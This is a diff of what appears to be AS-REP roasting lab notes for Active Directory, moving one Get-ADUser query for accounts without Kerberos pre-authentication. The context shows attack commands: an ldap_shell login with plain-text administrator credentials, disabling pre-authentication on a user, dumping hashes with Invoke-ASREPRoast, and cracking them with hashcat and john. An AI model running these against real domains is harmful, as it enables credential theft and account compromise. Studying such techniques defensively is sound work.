@@ -68,6 +68,9 @@ ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
 set_dontreqpreauth yashika true
 set_dontreqpreauth yashika false
 
+#get information about pre-authentication disable
+Get-ADUser -Filter "useraccountcontrol -band 4194304" -Properties useraccountcontrol | Format-Table name 
+
 #in valid_user.txt
 jdoe
 asmith
@@ -102,7 +105,7 @@ Import-Module .\ASREPRoast.ps1
 Invoke-ASREPRoast
 Invoke-ASREPRoast | select -ExpandProperty Hash > hashdump
 
-Get-ADUser -Filter "useraccountcontrol -band 4194304" -Properties useraccountcontrol | Format-Table name 
+
 
 hashcat -m 18200 asreproast_hashes.txt rockyou.txt
 john -w=/usr/share/wordlists/rockyou.txt hashes
